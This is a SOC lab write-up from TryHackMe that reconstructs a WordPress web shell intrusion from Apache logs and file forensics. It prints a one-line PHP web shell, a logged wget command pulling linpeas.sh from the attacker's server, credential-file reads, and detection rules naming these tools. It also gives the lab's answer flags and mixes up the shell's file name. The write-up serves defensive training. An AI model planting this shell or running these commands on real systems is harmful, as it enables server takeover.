# 🔍 SOC Investigation: Web Shell Detection – File Upload Abuse, RCE & Post-Exploitation Analysis

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-black?style=flat&logo=tryhackme)](https://tryhackme.com)
[![Path](https://img.shields.io/badge/Path-SOC%20Level%201-blue?style=flat)](https://tryhackme.com/path/outline/soclevel1)
[![Topic](https://img.shields.io/badge/Topic-Web%20Shell%20Detection-007ACC?style=flat)]()
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat)]()
[![Status](https://img.shields.io/badge/Status-Completed-success?style=flat)]()
[![Tools](https://img.shields.io/badge/Tools-Apache%20Logs%20%7C%20Linux%20CLI%20%7C%20Wireshark-blue?style=flat)]()

Post-compromise SOC investigation into a WordPress web application breach. An attacker exploited a vulnerable file upload form to deploy a PHP web shell, execute remote commands under the web server account, and stage a privilege escalation toolkit. Tasked with reconstructing the full attack chain using Apache access logs, file system forensics, and network traffic analysis.

**Attack chain confirmed:**
> Directory Fuzzing → WordPress Admin Brute-Force → File Upload Abuse → Web Shell Deployment → Remote Command Execution → Post-Exploitation Tool Download (`linpeas.sh`)

---

## 📌 Investigation Summary

| Field | Detail |
|-------|--------|
| **Incident** | WordPress web application compromise via malicious file upload |
| **Target** | WordPress site at `/wordpress/wp-content/uploads/` |
| **Attacker IP** | 203.0.113.66 |
| **Attacker User-Agent** | `ashadyagent/1.1` |
| **Web Shell** | `shadyshell.php` — deployed to `/wordpress/wp-content/uploads/` |
| **Execution Context** | `www-data` (web server account) |
| **Evidence Sources** | Apache access logs, file system (`cat`, `find`), web shell source code |
| **Outcome** | Full attack chain reconstructed — web shell located, commands traced, flags extracted |

---

## 🎯 Key Findings

| # | Finding | Evidence Source |
|---|---------|----------------|
| 1 | Attacker IP `203.0.113.66` identified via `ashadyagent/1.1` User-Agent string | Access logs |
| 2 | First valid directory discovered: `/wordpress/wp-admin/admin-ajax.php` (200 response) | Access logs |
| 3 | Web shell uploaded via `upload_form.php` → `shadyshell.php` deployed | Access logs |
| 4 | First RCE command: `whoami` → returned `www-data` | Access logs + web shell |
| 5 | Post-exploitation: `linpeas.sh` downloaded via `wget` for privilege escalation | Access logs |
| 6 | Web shell source: `<?php system($_GET['cmd']); ?>` | File system forensics |
| 7 | Flag recovered via web shell RCE — `cat flag.txt` → `THM{W3b_Sh3ll_Usag3}` | Web shell execution |
| 8 | Hidden flag extracted from web shell source code → `THM{W3b_Sh3ll_Int3rnals}` | File system forensics |

---

## 🔎 Investigation Walkthrough

### Phase 1 — Reconnaissance: Directory Fuzzing

**Attacker IP**: 203.0.113.66
**User-Agent**: `ashadyagent/1.1`
**Timestamp**: 17/Jul/2025 05:22:03 UTC

Access logs revealed a high-volume burst of GET requests across WordPress paths — `/wordpress/wp-common`, `/wordpress/files`, `/wordpress/uploads`, `/wordpress/wp-content/admin`, `/wordpress/wp-admin/uploads.php` — all returning `404`. The custom User-Agent `ashadyagent/1.1` immediately flagged the traffic as automated reconnaissance.

The attacker's first successful directory hit — returning `200` — was `/wordpress/wp-admin/admin-ajax.php`, revealing a valid and accessible WordPress admin endpoint.

#### 📸 Screenshot 1 — Directory Fuzzing via `ashadyagent/1.1` User-Agent
<img width="1362" height="726" alt="image" src="https://github.com/user-attachments/assets/c534f147-103b-44fb-8e45-3120765277e2" />


*Burst of 404 responses from 203.0.113.66 with ashadyagent/1.1 User-Agent — classic automated directory enumeration pattern*

---

### Phase 2 — Initial Access: WordPress Admin Brute-Force & Login

**Target**: `/wordpress/wp-login.php`
**Indicator**: `302` redirect followed by authenticated access to `/wordpress/wp-admin/`

Access logs showed the attacker targeting the WordPress login page. A `302` redirect from `/wordpress/wp-admin/` confirmed successful authentication. The attacker now had authenticated access to the WordPress admin panel — including the file upload functionality.

#### 📸 Screenshot 2 — Attacker IP Confirmed & Successful Admin Login via 302 Redirect
<img width="1362" height="726" alt="image" src="https://github.com/user-attachments/assets/fee86a01-b3e0-4970-83f4-65dc816236f8" />

*203.0.113.66 identified as attacker — 200 responses on valid paths and 302 redirect confirms successful WordPress admin login*

---

### Phase 3 — Persistence: Web Shell Upload & Deployment

**Upload Vector**: `POST /wordpress/wp-content/uploads/upload_form.php?file=shadyshell.php`
**Timestamp**: 17/Jul/2025 06:09:27 UTC
**Web Shell Location**: `/wordpress/wp-content/uploads/shadyshell.php`

The attacker used the authenticated session to POST a malicious PHP file via `upload_form.php`. The web shell `shadyshell.php` was successfully written to the uploads directory — a publicly accessible path — giving the attacker persistent HTTP-based command execution on the server.

#### 📸 Screenshot 3 — Web Shell Upload via `upload_form.php` Captured in Access Logs
<img width="1362" height="726" alt="image" src="https://github.com/user-attachments/assets/dcc422fd-f8dc-4fc2-baee-7740ba4e7ddf" />


*POST to upload_form.php?file=shadyshell.php — web shell successfully deployed to /wp-content/uploads/*

---

### Phase 4 — Execution: Remote Command Execution via Web Shell

**Web Shell URL**: `http://127.0.0.1:8080/files/awebshell.php?cmd=whoami`
**First Command**: `whoami`
**Output**: `www-data`

Immediately after deployment, the attacker accessed `shadyshell.php` directly via HTTP and began executing system commands. The first command — `whoami` — confirmed execution context as `www-data`, the web server service account.

Subsequent commands observed in access logs:
- `cmd=id` — user and group identification
- `cmd=uname -a` — kernel and OS version enumeration
- `cmd=ls -la /home` — home directory listing
- `cmd=cat /etc/passwd` — local user account enumeration
- `cmd=cat flag.txt` — flag file read, confirming full filesystem access

#### 📸 Screenshot 4 — Web Shell RCE Confirmed — `whoami` Returns `www-data`
<img width="1366" height="724" alt="image" src="https://github.com/user-attachments/assets/57719186-cda3-482e-bce7-0a223481ad54" />


*Web shell accessible at /files/awebshell.php — cmd=whoami returns www-data confirming RCE under web server account*

#### 📸 Screenshot 4b — Flag Retrieved via Web Shell — `cat flag.txt` → `THM{W3b_Sh3ll_Usag3}`
<img width="1364" height="724" alt="image" src="https://github.com/user-attachments/assets/511aeb51-2a3a-4c63-a6f2-6b2326fa34db" />

*cmd=cat+flag.txt executed via web shell — THM{W3b_Sh3ll_Usag3} returned, confirming full read access to server filesystem*

#### 📸 Screenshot 6 — First RCE Command (`whoami`) Identified in Access Logs
<img width="1366" height="731" alt="image" src="https://github.com/user-attachments/assets/8e98320f-1bdb-4b41-b954-966e73212759" />


*Access log confirms first web shell command: shadyshell.php?cmd=whoami at 06:14:55 UTC*

#### 📸 Screenshot 7 — `linpeas.sh` Download via `wget` Captured in Access Logs
<img width="1366" height="731" alt="image" src="https://github.com/user-attachments/assets/a6d78225-1642-4878-bd05-0f18df7f4439" />


*Access log — cmd=wget http://203.0.113.66:8000/linpeas.sh — attacker staging privilege escalation toolkit from their own server*

---

### Phase 6 — File System Forensics: Web Shell Source & Hidden Flag

**Web Shell Path**: `/var/www/html/wordpress/wp-content/uploads/shadyshell.php`
**Web Shell Source**:
```php
<?php system($_GET['cmd']); ?>
```

**Hidden Flag**: `THM{W3b_Sh3ll_Int3rnals}`

File system inspection using `cat` on the web shell revealed a minimal but fully functional one-liner — `system($_GET['cmd'])` passes any URL parameter directly to the system shell with no sanitisation, authentication, or restrictions. An HTML comment in the source contained a hidden flag confirming deep code inspection.

#### 📸 Screenshot 8 — Web Shell Source Code & Hidden Flag Extracted via `cat`
<img width="1366" height="731" alt="image" src="https://github.com/user-attachments/assets/05144041-129d-422d-950d-0021e985ed33" />

*cat /var/www/html/wordpress/wp-content/uploads/shadyshell.php — one-line web shell source confirmed, hidden flag THM{W3b_Sh3ll_Int3rnals} extracted from HTML comment*

---

## 🧭 MITRE ATT&CK Mapping

| Tactic | Technique | ID | Observed |
|--------|-----------|----|----------|
| Reconnaissance | Active Scanning | T1595 | Directory fuzzing with `ashadyagent/1.1` |
| Initial Access | Exploit Public-Facing Application | T1190 | Vulnerable file upload form abused |
| Persistence | Web Shell | T1505.003 | `shadyshell.php` deployed to uploads directory |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | RCE via `system($_GET['cmd'])` |
| Discovery | System Information Discovery | T1082 | `whoami`, `id`, `uname -a` executed |
| Discovery | Account Discovery | T1087 | `cat /etc/passwd` executed |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 | `linpeas.sh` downloaded for local enumeration |
| Command & Control | Ingress Tool Transfer | T1105 | `linpeas.sh` pulled from attacker-controlled server |

---

## 🛡 Containment & Hardening Recommendations

### Immediate Response
- **Isolate the compromised host** — remove from network to prevent further C2 communication
- **Delete `shadyshell.php`** from `/wp-content/uploads/` immediately
- **Block `203.0.113.66`** at the firewall — attacker IP confirmed across all phases
- **Reset all WordPress admin credentials** — authentication was compromised
- **Check for additional web shells** — `find /var/www -name "*.php" -newer /var/www/html/wordpress/wp-config.php`

### File Upload Hardening
- Restrict uploads to **non-executable file types only** (images, PDFs) — block `.php`, `.phtml`, `.phar`
- Move the uploads directory **outside the web root** or disable PHP execution within it:
```apache
<Directory /var/www/html/wordpress/wp-content/uploads>
    php_flag engine off
</Directory>
```
- Implement **server-side MIME type validation** — do not trust client-supplied Content-Type headers

### Detection Rules (SIEM / WAF)
- Alert on **POST requests to upload endpoints** followed by GET requests to the same filename
- Alert on **custom or suspicious User-Agent strings** — `ashadyagent`, `curl`, `python-requests` in non-API contexts
- Alert on **`?cmd=`** or **`?exec=`** parameters in GET requests to `.php` files in upload directories
- Flag **`wget`** or **`curl`** appearing in URL-decoded query strings — indicates tool staging via web shell
- Monitor for **`/etc/passwd`**, **`/etc/shadow`**, or **`linpeas`** appearing in web server access logs

---

## 📌 Investigator Notes

> Web shells are among the most dangerous post-compromise artifacts because they are persistent, stealthy, and require no active attacker connection.
> A single unsanitised file upload form gave this attacker full command execution on the server.
> Detection required three sources working together:
> — Access logs revealed the upload and command sequence
> — File system forensics confirmed the shell and exposed hidden artefacts
> — Network traffic validated the execution and tool staging
> No single source was sufficient alone.

---

## 📌 Skills Demonstrated

- Apache access log triage and attacker behaviour pattern recognition
- Web shell identification, location, and source code analysis
- Linux CLI forensics (`cat`, `find`, `grep`) for file system investigation
- Multi-source attack chain reconstruction (logs + file system + network)
- Post-exploitation technique identification (`linpeas.sh`, `cat /etc/passwd`)
- MITRE ATT&CK mapping for web shell intrusion scenarios
- WAF rule and SIEM detection rule development
- Structured, SOC-grade incident documentation

---

**Completed**: April 2026

Full portfolio of SOC investigations available at [github.com/ugbomakyrian5-web](https://github.com/ugbomakyrian5-web)

Feel free to fork, star, or reach out. Open to feedback and collaboration!

MIT License – see the [LICENSE](LICENSE) file for details.
